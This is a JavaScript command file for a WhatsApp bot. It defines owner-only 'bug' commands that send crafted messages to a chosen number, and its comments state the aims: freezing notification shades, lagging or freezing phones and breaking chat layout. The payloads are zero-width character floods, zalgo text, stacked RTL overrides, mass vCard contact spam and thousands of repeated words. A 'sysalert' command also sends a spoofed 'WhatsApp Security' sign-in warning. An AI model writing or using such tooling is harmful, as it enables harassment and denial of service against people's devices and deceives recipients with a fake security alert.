// Bug commands: WhatsApp-crash / annoy tricks.
// These are prank tools — use only on people who know and expect it.
// All commands require the sender to be the bot owner (owner: true).
import { say } from '../lib/card.js';
import { PREFIX } from '../lib/config.js';

/* ------------------------------------------------------------------ helpers */

// Build a giant invisible-character string that bloats a notification
// and can freeze the notification drawer on some Android skins.
function overflowText(repeat = 2000) {
  // Zero-width joiner + zero-width non-joiner alternating so the string
  // is non-empty but renders as blank on most devices.
  const ZWJ  = '‍';
  const ZWNJ = '‌';
  const chunk = ZWJ + ZWNJ;
  return chunk.repeat(repeat);
}

// Zalgo / "glitch" text — stacks combining diacritics above and below
// each character. Causes rendering lag in WhatsApp's text engine on old phones.
function zalgoChar(ch) {
  const above = ['̀','́','̂','̃','̄','̅','̆','̇','̈','̊','̋','̍','̎','̐','̒','̓','̕','̚','̛','̽','̾','̿','̀','́','͂','̓','̈́','͆','͊','͋','͌','͐','͑','͒','͗','͘','͛','ͣ','ͤ','ͥ','ͦ','ͧ','ͨ','ͩ','ͪ','ͫ','ͬ','ͭ','ͮ','ͯ'];
  const below = ['̖','̗','̘','̙','̜','̝','̞','̟','̠','̤','̥','̦','̩','̪','̫','̬','̭','̮','̯','̰','̱','̲','̳','̹','̺','̻','̼','ͅ','͇','͈','͉','͍','͎','͓','͔','͕','͖','͙','͚','͟'];
  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let out = ch;
  for (let i = 0; i < 15; i++) out += pick(above);
  for (let i = 0; i < 10; i++) out += pick(below);
  return out;
}
function zalgo(text) { return [...text].map(zalgoChar).join(''); }

// RTL override sandwich: wraps text so the BiDi algorithm flips the
// rendering direction mid-sentence, making chat unreadable on many devices.
const RLO = '‮'; // right-to-left override
const PDF = '‬'; // pop directional formatting
function rtlFlip(text) { return RLO + text + PDF; }

// Fake system-message style: looks like a WhatsApp security / account alert.
function fakeSystem(lines) {
  return [
    '🔒 *WhatsApp Security*',
    '━━━━━━━━━━━━━━━━━━━━',
    ...lines,
    '━━━━━━━━━━━━━━━━━━━━',
    '_This is an automated alert from WhatsApp._'
  ].join('\n');
}

// A large vCard with junk contact names — sending 50+ contacts in a single
// message forces WhatsApp's contact-list renderer to build a huge list and
// can slow/freeze older devices.
function spamContactsPayload(count = 60) {
  const contacts = [];
  for (let i = 0; i < count; i++) {
    const num = `+9477${String(i).padStart(7, '0')}`;
    contacts.push({
      displayName: `Contact ${i}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Contact ${i}\nTEL;type=CELL;waid=${num.replace('+', '')}:${num}\nEND:VCARD`
    });
  }
  return contacts;
}

/* ------------------------------------------------------------------ commands */

export default [
  // ── bugmenu ──────────────────────────────────────────────────────────────
  {
    name: 'bugmenu', aliases: ['bughelp', 'bugslist'],
    owner: true,
    async run({ reply }) {
      const p = PREFIX;
      return reply([
        '╭━━━〔 🐛 *BUG COMMANDS* 〕━━━⬣',
        '┃ Owner-only prank / stress tools.',
        '┃',
        `┃ ${p}crash    — overflow notification`,
        `┃ ${p}zalgo    — glitch-text message`,
        `┃ ${p}rtlbug   — RTL-flip text`,
        `┃ ${p}sysalert — fake system alert`,
        `┃ ${p}cspam    — contact-list flood`,
        `┃ ${p}blankbug — blank-looking giant msg`,
        `┃ ${p}repeatbug — repeat-text freeze`,
        '┃',
        '┃ Usage: reply/mention a number or',
        '┃ type the number after the command.',
        '┃ e.g.  .crash @mention',
        '┃       .zalgo Hello 94771234567',
        '╰━━━━━━━━━━━━━━━━━━━━⬣',
      ].join('\n'));
    },
  },

  // ── crash ─────────────────────────────────────────────────────────────────
  // Sends an invisible-character-flooded message that bloats the push
  // notification and can freeze the notification shade on some phones.
  {
    name: 'crash', aliases: ['notifbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const text   = (args.slice(0).join(' ').trim()) || '👋';
      const payload = text + overflowText(3000);
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Crash message sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── blankbug ──────────────────────────────────────────────────────────────
  // Sends a message that looks completely empty in the chat list preview
  // but loads a huge hidden character blob — the preview shows nothing,
  // which confuses the recipient and wastes render cycles on the home screen.
  {
    name: 'blankbug', aliases: ['nullmsg', 'emptybug'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      const payload = overflowText(5000);
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Blank-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── zalgo ─────────────────────────────────────────────────────────────────
  // Sends text decorated with hundreds of stacking diacritics.
  // Causes visual lag / skipped frames on old Android phones with
  // WhatsApp's canvas-based text renderer.
  {
    name: 'zalgo', aliases: ['glitch', 'cursedtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const base   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'WhatsApp';
      const payload = zalgo(base);
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Zalgo sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── rtlbug ────────────────────────────────────────────────────────────────
  // Wraps a message in a Unicode RTL-override so it renders backwards.
  // Enough RTL overrides stacked without matching PDF codepoints can
  // cause the chat bubble layout engine to mis-calculate widths on some
  // builds, making the whole conversation temporarily unscrollable.
  {
    name: 'rtlbug', aliases: ['rtl', 'fliptext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const base   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Hello from WhatsApp';
      // Stack several RLO without PDF to maximise bidi confusion
      const payload = Array.from({ length: 10 }, () => rtlFlip(base)).join('\n');
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ RTL-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── sysalert ──────────────────────────────────────────────────────────────
  // Sends a spoofed-looking "WhatsApp Security" notice. The text is
  // obviously fake on close inspection but can cause momentary panic.
  {
    name: 'sysalert', aliases: ['fakealert', 'fakesys'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target  = targetJid() || jid;
      const custom  = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
      const payload = fakeSystem(
        custom
          ? [custom]
          : [
              '⚠️ Unusual sign-in activity detected.',
              'Your account may have been accessed',
              'from an unrecognized device.',
              '',
              'Tap *Settings → Linked Devices*',
              'and remove any device you don\'t recognize.'
            ]
      );
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Fake-alert sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── cspam ─────────────────────────────────────────────────────────────────
  // Sends a contactsArrayMessage with 60 dummy contacts in one shot.
  // WhatsApp's contact-preview renderer has to build 60 avatar rows
  // at once; on memory-limited phones this triggers a noticeable
  // frame drop or a brief freeze.
  {
    name: 'cspam', aliases: ['contactspam', 'contactbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const count  = Math.min(100, Math.max(1, parseInt(args.find((a) => /^\d+$/.test(a)) || '60', 10)));
      const contacts = spamContactsPayload(count);
      try {
        await sock.sendMessage(target, { contacts: { displayName: `${count} Contacts`, contacts } }, { quoted: msg });
        return reply(`✅ ${count} contacts sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── repeatbug ─────────────────────────────────────────────────────────────
  // Sends a single message whose text is a word repeated thousands of times.
  // The notification preview tries to truncate it but the full string is
  // still allocated in memory, causing a momentary stutter on old phones.
  {
    name: 'repeatbug', aliases: ['repeatcrash', 'spamtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const word   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, '')) && a.length <= 20).join(' ').trim() || 'ha';
      const times  = 4000;
      const payload = (word + ' ').repeat(times).trimEnd();
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Repeat-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },
];
